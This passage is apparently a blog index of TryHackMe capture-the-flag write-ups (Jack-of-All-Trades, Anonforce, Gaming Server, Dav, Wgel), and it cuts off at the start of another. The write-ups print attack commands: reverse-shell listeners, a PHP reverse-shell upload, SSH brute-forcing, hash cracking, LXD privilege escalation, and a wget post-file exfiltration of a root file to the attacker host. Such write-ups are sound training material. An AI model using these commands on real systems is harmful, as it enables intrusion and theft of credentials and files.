/bin/sh {LOCAL MACHINE IP} {PORT}\nBefore running a nc reverse shell start a listener on the local machine.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  nc -lnvp 3333 listening on [any] 3333 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.122.111] 34946 whoami www-data python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; www-data@jack-of-all-trades:/var/www/html/nnxhweOV$ cd /home www-data@jack-of-all-trades:/home$ ls -la ls -la total 16 drwxr-xr-x 3 root root 4096 Feb 29 2020 . drwxr-xr-x 23 root root 4096 Feb 29 2020 .. drwxr-x--- 3 jack jack 4096 Feb 29 2020 jack -rw-r--r-- 1 root root 408 Feb 29 2020 jacks_password_list www-data@jack-of-all-trades:/home$ cat jacks_password_list cat jacks_password_list *hclqAzj+2GC+=0K eN\u0026lt;A@n^zI?FE$I5, X\u0026lt;(@zo2XrEN)#MGC ,,aE1K,nW3Os,afb ITMJpGGIqg1jn?\u0026gt;@ 0HguX{,fgXPE;8yF sjRUb4*@pz\u0026lt;*ZITu [8V7o^gl(Gjt5[WB yTq0jI$d}Ka\u0026lt;T}PD Sc.[[2pL\u0026lt;\u0026gt;e)vC4} 9;}#q*,A4wd{\u0026lt;X.T M41nrFt#PcV=(3%p GZx.t)H$\u0026amp;awU;SO\u0026lt; .MVettz]a;\u0026amp;Z;cAC 2fh%i9Pr5YiYIf51 TDF@mdEd3ZQ(]hBO v]XBmwAk8vk5t3EF 9iYZeZGQGG9\u0026amp;W4d1 8TIFce;KjrBWTAY^ SeUAwt7EB#fY\u0026amp;+yt n.FZvJ.x9sYe5s5d 8lN{)g32PG,1?[pM z@e1PmlmQ%k5sDz@ ow5APF\u0026gt;6r,y4krSo www-data@jack-of-all-trades:/home$ python -m SimpleHTTPServer 8000 python -m SimpleHTTPServer 8000 Serving HTTP on 0.0.0.0 port 8000 ...   In the home directory we can find password file which we will download with help of python server.\n\nSSH Brute-Forcing 1 2 3 4 5 6 7 8 9 10  hydra -l jack -P jacks_password_list ssh://{TARGET MACHINE IP} -s 80 Hydra v9.1 (c) 2020 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-05 13:25:01 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:1/p:24), ~2 tries per task [DATA] attacking ssh://10.10.122.111:80/ [80][ssh] host: 10.10.122.111 login: jack password: ITMJpGGIqg1jn?\u0026gt;@ 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-05 13:25:06   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  ssh jack@{TARGET MACHINE IP} -p 80 The authenticity of host \u0026#39;[10.10.122.111]:80 ([10.10.122.111]:80)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:wABOsY4G6TIcuJ2bmAIpsoBGVR06p/QGP2J7tfiSy2s. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;[10.10.122.111]:80\u0026#39; (ECDSA) to the list of known hosts. jack@10.10.122.111\u0026#39;s password: jack@jack-of-all-trades:~$ ls -la total 312 drwxr-x--- 3 jack jack 4096 Feb 29 2020 . drwxr-xr-x 3 root root 4096 Feb 29 2020 .. lrwxrwxrwx 1 root root 9 Feb 29 2020 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 jack jack 220 Feb 29 2020 .bash_logout -rw-r--r-- 1 jack jack 3515 Feb 29 2020 .bashrc drwx------ 2 jack jack 4096 Feb 29 2020 .gnupg -rw-r--r-- 1 jack jack 675 Feb 29 2020 .profile -rwxr-x--- 1 jack jack 293302 Feb 28 2020 user.jpg jack@jack-of-all-trades:~$ python -m SimpleHTTPServer 3333 Serving HTTP on 0.0.0.0 port 3333 ...   Once again start the pyhton server so we can view the user.jpg image.\nUser Flag \nRoot Flag Now use find command to look for all files with SUID.\nSUID is a special type of file permissions given to a file. Normally in Linux/Unix when a program runs, it inherit’s access permissions from the logged in user. SUID is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs it. In simple words users will get file owner’s permissions as well as owner UID and GID when executing a file/program/command. (https://www.linuxnix.com/suid-set-suid-linuxunix/)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  jack@jack-of-all-trades:~$ find / -perm /4000 2\u0026gt; /dev/null /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/pt_chown /usr/bin/chsh /usr/bin/at /usr/bin/chfn /usr/bin/newgrp /usr/bin/strings /usr/bin/sudo /usr/bin/passwd /usr/bin/gpasswd /usr/bin/procmail /usr/sbin/exim4 /bin/mount /bin/umount /bin/su   And we are lucky because thanks to SUID permission for strings we are able to read the root.txt\n1 2 3 4 5 6 7 8  jack@jack-of-all-trades:~$ strings /root/root.txt ToDo: 1.Get new penguin skin rug -- surely they won\u0026#39;t miss one or two of those blasted creatures? 2.Make T-Rex model! 3.Meet up with Johny for a pint or two 4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her? 5.Remember to finish that contract for Lisa. 6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}   ","description":"Boot-to-root originally designed for Securi-Tay 2020","id":23,"section":"posts","tags":["enumeration","privilege escalation","steganography","command injection","brute force"],"title":"Jack-of-All-Trades [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/jack-of-all-trades/"},{"content":"   Title Anonforce     Info Boot2root machine for FIT and bsides guatemala CTF   Difficulty Easy    Scanning \u0026amp; Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  nmap -A -T4 {TARGET MACHINE IP} Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-04 03:05 CST Nmap scan report for 10.10.21.216 Host is up (0.070s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxr-xr-x 2 0 0 4096 Aug 11 2019 bin | drwxr-xr-x 3 0 0 4096 Aug 11 2019 boot | drwxr-xr-x 17 0 0 3700 Jan 04 01:03 dev | drwxr-xr-x 85 0 0 4096 Aug 13 2019 etc | drwxr-xr-x 3 0 0 4096 Aug 11 2019 home | lrwxrwxrwx 1 0 0 33 Aug 11 2019 initrd.img -\u0026gt; boot/initrd.img-4.4.0-157-generic | lrwxrwxrwx 1 0 0 33 Aug 11 2019 initrd.img.old -\u0026gt; boot/initrd.img-4.4.0-142-generic | drwxr-xr-x 19 0 0 4096 Aug 11 2019 lib | drwxr-xr-x 2 0 0 4096 Aug 11 2019 lib64 | drwx------ 2 0 0 16384 Aug 11 2019 lost+found | drwxr-xr-x 4 0 0 4096 Aug 11 2019 media | drwxr-xr-x 2 0 0 4096 Feb 26 2019 mnt | drwxrwxrwx 2 1000 1000 4096 Aug 11 2019 notread [NSE: writeable] | drwxr-xr-x 2 0 0 4096 Aug 11 2019 opt | dr-xr-xr-x 102 0 0 0 Jan 04 01:03 proc | drwx------ 3 0 0 4096 Aug 11 2019 root | drwxr-xr-x 18 0 0 540 Jan 04 01:03 run | drwxr-xr-x 2 0 0 12288 Aug 11 2019 sbin | drwxr-xr-x 3 0 0 4096 Aug 11 2019 srv | dr-xr-xr-x 13 0 0 0 Jan 04 01:03 sys |_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all. | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.9.140.180 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA) | 256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA) |_ 256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)   FTP Based on nmap scan we are allowed to use anonymous authentication.\nLooking around we can find two interesting files in the /notread directory.\nDownload both backup.pgp and private.asc to your local machine with get command.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  ftp {TARGET MACHINE IP} Connected to 10.10.21.216. 220 (vsFTPd 3.0.3) Name (10.10.21.216:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ftp\u0026gt; cd notread 250 Directory successfully changed. ftp\u0026gt; ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxrwx 2 1000 1000 4096 Aug 11 2019 . drwxr-xr-x 23 0 0 4096 Aug 11 2019 .. -rwxrwxrwx 1 1000 1000 524 Aug 11 2019 backup.pgp -rwxrwxrwx 1 1000 1000 3762 Aug 11 2019 private.asc 226 Directory send OK. ftp\u0026gt; get backup.pgp local: backup.pgp remote: backup.pgp 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for backup.pgp (524 bytes). 226 Transfer complete. 524 bytes received in 0.00 secs (563.5669 kB/s) ftp\u0026gt; get private.asc local: private.asc remote: private.asc 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for private.asc (3762 bytes). 226 Transfer complete. 3762 bytes received in 0.00 secs (1.1955 MB/s)   User flag Proceeding with enumeration we can find user flag in melodias folder.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  ftp\u0026gt; cd home 250 Directory successfully changed. ftp\u0026gt; ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 3 0 0 4096 Aug 11 2019 . drwxr-xr-x 23 0 0 4096 Aug 11 2019 .. drwxr-xr-x 4 1000 1000 4096 Aug 11 2019 melodias 226 Directory send OK. ftp\u0026gt; cd melodias 250 Directory successfully changed. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-rw-r-- 1 1000 1000 33 Aug 11 2019 user.txt 226 Directory send OK. ftp\u0026gt; get user.txt local: user.txt remote: user.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for user.txt (33 bytes). 226 Transfer complete. 33 bytes received in 0.00 secs (8.7075 kB/s) ftp\u0026gt; cat user.txt | wc -c 40   GPG 1 2 3 4 5 6 7  ls total 20K -rw-r--r-- 1 root root 524 Jan 4 03:22 backup.pgp -rw-r--r-- 1 root root 3.7K Jan 4 03:22 private.asc -rw-r--r-- 1 root root 33 Jan 4 03:22 user.txt drwxr-xr-x 16 root root 4.0K Jan 4 03:25 .. drwxr-xr-x 2 root root 4.0K Jan 4 03:27 .   Prepare found key file for decryption with gpg2john and then crack the passphrase.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  gpg2john private.asc \u0026gt; hash john --format=gpg hash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64]) Cost 1 (s2k-count) is 65536 for all loaded hashes Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status xbox360 (anonforce) 1g 0:00:00:00 DONE (2021-01-04 03:30) 4.545g/s 4227p/s 4227c/s 4227C/s xbox360..sheena Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed   Now we are able to import previously downloaded private key with the cracked passphrase.\n1 2 3 4 5 6 7 8 9  gpg --import private.asc gpg: key B92CD1F280AD82C2: public key \u0026#34;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026#34; imported gpg: key B92CD1F280AD82C2: secret key imported gpg: key B92CD1F280AD82C2: \u0026#34;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026#34; not changed gpg: Total number processed: 2 gpg: imported: 1 gpg: unchanged: 1 gpg: secret keys read: 1 gpg: secret keys imported: 1   Gaining Access Backup decryption revealed that it is an actually copy of the shadow file with the root password hash.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  gpg --decrypt backup.pgp gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12 \u0026#34;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026#34; root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7::: daemon:*:17953:0:99999:7::: bin:*:17953:0:99999:7::: sys:*:17953:0:99999:7::: sync:*:17953:0:99999:7::: games:*:17953:0:99999:7::: man:*:17953:0:99999:7::: lp:*:17953:0:99999:7::: mail:*:17953:0:99999:7::: news:*:17953:0:99999:7::: uucp:*:17953:0:99999:7::: proxy:*:17953:0:99999:7::: www-data:*:17953:0:99999:7::: backup:*:17953:0:99999:7::: list:*:17953:0:99999:7::: irc:*:17953:0:99999:7::: gnats:*:17953:0:99999:7::: nobody:*:17953:0:99999:7::: systemd-timesync:*:17953:0:99999:7::: systemd-network:*:17953:0:99999:7::: systemd-resolve:*:17953:0:99999:7::: systemd-bus-proxy:*:17953:0:99999:7::: syslog:*:17953:0:99999:7::: _apt:*:17953:0:99999:7::: messagebus:*:18120:0:99999:7::: uuidd:*:18120:0:99999:7::: melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7::: sshd:*:18120:0:99999:7::: ftp:*:18120:0:99999:7:::   Root flag Root password hash: $6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0\nSaved to rootHash and analysed with hash-identifier.\n1 2 3 4 5 6 7  hash-identifier ------------------------------------------------- HASH: $6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0 Possible Hashs: [+] SHA-256 --------------------------------------------------   Now as we know the hash format we can crack it with john and then authenticate with ssh as root.\n1 2 3 4 5 6 7 8 9 10  john --format=sha512crypt rootHash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status hikari (?) 1g 0:00:00:06 DONE (2021-01-04 03:35) 0.1545g/s 1048p/s 1048c/s 1048C/s 98765432..random1 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  ssh root@{TARGET MACHINE IP} The authenticity of host \u0026#39;10.10.21.216 (10.10.21.216)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:5evbK4JjQatGFwpn/RYHt5C3A6banBkqnngz4IVXyz0. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.21.216\u0026#39; (ECDSA) to the list of known hosts. root@10.10.21.216\u0026#39;s password: Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. root@ubuntu:~# ls root.txt root@ubuntu:~# cat root.txt | wc -c 33   ","description":"Boot2root machine for FIT and bsides guatemala CTF","id":24,"section":"posts","tags":["ftp","pgp","gpg","hash cracking"],"title":"Anonforce [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/anonforce/"},{"content":"   Title Gaming Server     Info An Easy Boot2Root box for beginners   Difficulty Easy    Scanning \u0026amp; Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14  nmap -A -T4 {TARGET MACHINE IP} Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-03 01:08 CST Nmap scan report for 10.10.125.45 Host is up (0.074s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 34:0e:fe:06:12:67:3e:a4:eb🆎7a:c4:81:6d:fe:a9 (RSA) | 256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA) |_ 256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: House of danak   Note found in the source code of the page:\n1 2 3  \u0026lt;/body\u0026gt; \u0026lt;!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. --\u0026gt; \u0026lt;/html\u0026gt;   Directory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  gobuster dir -u http://{TARGET MACHINE IP} -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.125.45 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2021/01/03 01:08:48 Starting gobuster =============================================================== /.hta (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /index.html (Status: 200) /robots.txt (Status: 200) /secret (Status: 301) /server-status (Status: 403) /uploads (Status: 301) =============================================================== 2021/01/03 01:09:26 Finished =============================================================== http://{TARGET MACHINE IP}/robots.txt user-agent: * Allow: / /uploads/   \nFound file dict.lst contains a list of passwords.\nThe text file manifesto.txt looks like a message from a hacker.\nWhen we try to extract data from the meme.jpg image with steghide we are prompted to enter the passphrase which we don\u0026rsquo;t have for now.\nBack to results from Directory Brute-Forcing. Navigate to /secret directory.\nSomebody left a private key for ssh here for us.\n\nGaining Access Let\u0026rsquo;s crack the passphrase with john.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  ssh2john.py secretKey\u0026gt; secretKeyHash john --wordlist=/usr/share/wordlists/rockyou.txt secretKeyHash Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 2 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status letmein (secretKeyHash) 1g 0:00:00:09 DONE (2021-01-03 01:19) 0.1026g/s 1472Kp/s 1472Kc/s 1472KC/sa6_123..*7¡Vamos! Session completed   Based on the note from the source code let\u0026rsquo;s try ssh as john:\n1  ssh -i secret_id_rsa john@{TARGET MACHINE IP}   Use the cracked passphrase and we are in.\nUser Flag Located in /home/john\nPrivilege Escalation 1 2  john@exploitable:~$ id uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)   How to exploit lxd: https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation#method-2\nThe script is on github:\n1 2 3 4  git clone https://github.com/saghul/lxd-alpine-builder.git cd lxd-alphine-bulder ./build-alphine   Running the builder gives us an image inside a .tar.gz file.\nLet’s transfer it to the remote machine\nOn the local machine:\n1  python3 -m http.server   On the target machine:\n1  wget http://{LOCAL MACHINE IP}:8000/alpine-v3.12-x86_64-20210103_0137.tar.gz   Let’s add the image to lxd using the following command:\n1  lxc image import ./alpine-v3.12-x86_64-20210103_0137.tar.gz --alias myimage   After that we can initialize the image inside a new Linux container. Then mount it to the root directory.\n1 2 3  lxc init myimage ignite -c security.privileged=true lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true lxc start ignite   Root flag Now execute the /bin/sh to get root\n1 2 3 4 5 6 7  lxc exec ignite /bin/sh ~ # whoami root ~ # find / -type f -name root.txt 2\u0026gt;/dev/null /mnt/root/root/root.txt   ","description":"An Easy Boot2Root box for beginners","id":25,"section":"posts","tags":["enumeration","hash cracking","lxd","privilege escalation"],"title":"Gaming Server [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/gaming-server/"},{"content":"   Title Dav     Info Boot2root machine for FIT and bsides guatemala CTF   Difficulty Easy    Scanning \u0026amp; Enumeration NMAP 1 2 3 4 5 6  nmap -A -T4 10.10.237.27 PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works   Directory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  gobuster dir -u http://10.10.237.27 -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.237.27 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2021/01/02 14:27:27 Starting gobuster =============================================================== /.hta (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /index.html (Status: 200) /server-status (Status: 403) /webdav (Status: 401) =============================================================== 2021/01/02 14:28:12 Finished ===============================================================   Gaining Access WebDAV When accessing /webdav we are prompted with Authentication Required window:\n\nDefault credentials for WebDAV:\n https://community.apachefriends.org/f/viewtopic.php?p=83805 https://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html\n  \nContent found in passwd.dav:\nwampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91\n1 2 3 4 5 6 7  hash-identifier -------------------------------------------------- HASH: $apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91 Possible Hashs: [+] MD5(APR) --------------------------------------------------   For working with WebDAV we will use cadaver:\n http://www.webdav.org/cadaver/\nUse default credentials and upload PHP reverse shell:\n1 2 3 4 5 6 7 8 9 10  cadaver http://http://10.10.237.27/webdav/ Could not resolve hostname `http\u0026#39;: Host not found dav://10.10.237.27/webdav/? open http://10.10.237.27/webdav/ Authentication required for webdav on server `10.10.237.27\u0026#39;: Username: wampp Password: dav:/webdav/\u0026gt; put php-reverse-shell.php Uploading php-reverse-shell.php to `/webdav/php-reverse-shell.php\u0026#39;: Progress: [=============================\u0026gt;] 100.0% of 5494 bytes succeeded. dav:/webdav/\u0026gt;    1 2 3 4 5 6 7 8 9 10 11  nc -lnvp 4444 listening on [any] 4444 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.237.27] 43474 Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 12:51:49 up 27 min, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ whoami www-data $   User Flag Located in /home/merlin\nRoot Flag 1 2 3 4 5 6 7 8 9  sudo -l Matching Defaults entries for www-data on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on ubuntu: (ALL) NOPASSWD: /bin/cat sudo cat /root/root.txt   ","description":"Boot2root machine for FIT and bsides guatemala CTF","id":26,"section":"posts","tags":["exploitation","hash cracking","privilege escalation"],"title":"Dav [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/dav/"},{"content":"   Title Wgel     Info Can you exfiltrate the root flag?   Difficulty Easy    Scanning \u0026amp; Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11  nmap -A -T4 10.10.184.94 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA) | 256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA) |_ 256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works   Always look around the source code for names which can be later used as possible usernames for services.\n\nDirectory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  gobuster dir -u http://10.10.184.94 -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.184.94 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2021/01/01 11:16:59 Starting gobuster =============================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /index.html (Status: 200) /server-status (Status: 403) /sitemap (Status: 301) =============================================================== 2021/01/01 11:17:37 Finished ===============================================================   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  gobuster dir -u http://10.10.184.94/sitemap -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.184.94/sitemap [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2021/01/01 11:20:00 Starting gobuster =============================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /.ssh (Status: 301) /css (Status: 301) /fonts (Status: 301) /images (Status: 301) /index.html (Status: 200) /js (Status: 301) =============================================================== 2021/01/01 11:20:39 Finished ===============================================================   \nGaining Access Copy and save the private key to a file on your local machine.\n1 2 3  chmod 600 id_rsa ssh -i id_rsa jessie@10.10.184.94   User Flag Located in /home/jessie/Documents\nRoot Flag 1 2 3 4 5 6 7 8  jessie@CorpOne:~$ sudo -l Matching Defaults entries for jessie on CorpOne: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User jessie may run the following commands on CorpOne: (ALL : ALL) ALL (root) NOPASSWD: /usr/bin/wget   GTFOBins for usr/bin/wget : https://gtfobins.github.io/gtfobins/wget/\nStart a listener on your local machine and exfiltrate root_flag.txt with wget.\n1 2 3 4 5 6 7  root@kali:~/Documents/THM# nc -lvnp 3333 listening on [any] 3333 ... jessie@CorpOne:~$ sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.9.140.180:3333 --2021-01-01 19:35:47-- http://10.9.140.180:3333/ Connecting to 10.9.140.180:3333... connected. HTTP request sent, awaiting response...   . . .\n\n","description":"Can you exfiltrate the root flag?","id":27,"section":"posts","tags":["enumeration","exploitation"],"title":"Wgel [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/wgel/"},{"content":"   Title Mnemonic     Info I hope you have fun.   Difficulty Medium    Scanning \u0026amp; Enumeration Nmap  How many open ports?\nWhat is the ssh port number?\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  nmap -p- -A -T4 {TARGET MACHINE IP} Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-29 08:11 CST Stats: 0:01:26 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 11.32% done; ETC: 08:23 (0:11:14 remaining) Stats: 0:01:27 elapsed; 0 hosts completed (1 